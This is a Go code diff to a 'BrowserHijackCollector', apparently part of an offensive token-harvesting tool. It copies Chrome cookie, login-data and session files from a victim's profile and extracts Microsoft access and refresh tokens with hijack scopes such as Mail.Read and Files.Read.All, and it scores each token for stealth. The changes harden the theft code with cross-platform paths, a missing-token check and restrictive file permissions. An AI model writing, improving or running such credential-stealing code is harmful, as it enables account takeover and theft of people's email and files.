@@ -35,7 +35,7 @@ var hijackScopes = []string{
 	"profile",
 	"User.Read",
 	"Mail.Read",
-	"Files.ReadWrite.All",
+	"Files.Read.All",
 }
 
 const (
@@ -85,32 +85,32 @@ var msAuthBypassDomains = []string{
 var profileFiles = []string{
 	"Local State",
 	// Cookies (including WAL and journal)
-	"Default/Cookies",
-	"Default/Cookies-journal",
-	"Default/Cookies-wal",
-	"Default/Network/Cookies",
-	"Default/Network/Cookies-journal",
-	"Default/Network/Cookies-wal",
+	filepath.Join("Default", "Cookies"),
+	filepath.Join("Default", "Cookies-journal"),
+	filepath.Join("Default", "Cookies-wal"),
+	filepath.Join("Default", "Network", "Cookies"),
+	filepath.Join("Default", "Network", "Cookies-journal"),
+	filepath.Join("Default", "Network", "Cookies-wal"),
 	// Login state (saved credentials, session tokens)
-	"Default/Login Data",
-	"Default/Login Data-journal",
-	"Default/Login Data-wal",
-	"Default/Login Data For Account",
-	"Default/Login Data For Account-journal",
-	"Default/Web Data",
-	"Default/Web Data-journal",
+	filepath.Join("Default", "Login Data"),
+	filepath.Join("Default", "Login Data-journal"),
+	filepath.Join("Default", "Login Data-wal"),
+	filepath.Join("Default", "Login Data For Account"),
+	filepath.Join("Default", "Login Data For Account-journal"),
+	filepath.Join("Default", "Web Data"),
+	filepath.Join("Default", "Web Data-journal"),
 	// Chrome config
-	"Default/Preferences",
-	"Default/Secure Preferences",
+	filepath.Join("Default", "Preferences"),
+	filepath.Join("Default", "Secure Preferences"),
 	// Extension cookies (some auth flows use these)
-	"Default/Extension Cookies",
-	"Default/Extension Cookies-journal",
+	filepath.Join("Default", "Extension Cookies"),
+	filepath.Join("Default", "Extension Cookies-journal"),
 }
 
 // Directories to copy (shallow -- session state).
 var profileDirs = []string{
-	"Default/Session Storage",
-	"Default/Sessions",
+	filepath.Join("Default", "Session Storage"),
+	filepath.Join("Default", "Sessions"),
 }
 
 func init() {
@@ -465,12 +465,18 @@ func (c *BrowserHijackCollector) Collect() []*types.CollectedToken {
 		tokenScopes = strings.Fields(scopeStr)
 	}
 
+	accessToken, _ := tokenData["access_token"].(string)
+	if accessToken == "" {
+		c.Warn("token response missing access_token")
+		return nil
+	}
+
 	tok := types.NewCollectedToken(c.Svc, c.Src, c.StealthScore())
 	tok.AccountID = accountID
 	tok.Username = email
 	tok.DisplayName = displayName
 	tok.TenantID = tenantID
-	tok.AccessToken = types.Secure(tokenData["access_token"].(string))
+	tok.AccessToken = types.Secure(accessToken)
 	if rt, ok := tokenData["refresh_token"].(string); ok {
 		tok.RefreshToken = types.Secure(rt)
 	}
@@ -615,8 +621,8 @@ func (c *BrowserHijackCollector) copyProfile() (string, error) {
 
 	// Copy individual files.
 	for _, relPath := range profileFiles {
-		src := filepath.Join(chromeDir, filepath.FromSlash(relPath))
-		dst := filepath.Join(tempDir, filepath.FromSlash(relPath))
+		src := filepath.Join(chromeDir, relPath)
+		dst := filepath.Join(tempDir, relPath)
 		if _, err := os.Stat(src); err != nil {
 			continue
 		}
@@ -630,8 +636,8 @@ func (c *BrowserHijackCollector) copyProfile() (string, error) {
 
 	// Copy directories (session state).
 	for _, relDir := range profileDirs {
-		src := filepath.Join(chromeDir, filepath.FromSlash(relDir))
-		dst := filepath.Join(tempDir, filepath.FromSlash(relDir))
+		src := filepath.Join(chromeDir, relDir)
+		dst := filepath.Join(tempDir, relDir)
 		info, err := os.Stat(src)
 		if err != nil || !info.IsDir() {
 			continue
@@ -952,7 +958,7 @@ func fileExists(path string) bool {
 	return err == nil && !info.IsDir()
 }
 
-// copyFile copies a single file from src to dst, preserving permissions.
+// copyFile copies a single file from src to dst with restrictive 0600 permissions.
 func copyFile(src, dst string) error {
 	in, err := os.Open(src)
 	if err != nil {
@@ -960,12 +966,7 @@ func copyFile(src, dst string) error {
 	}
 	defer in.Close()
 
-	info, err := in.Stat()
-	if err != nil {
-		return err
-	}
-
-	out, err := os.OpenFile(dst, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, info.Mode())
+	out, err := os.OpenFile(dst, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
 	if err != nil {
 		return err
 	}
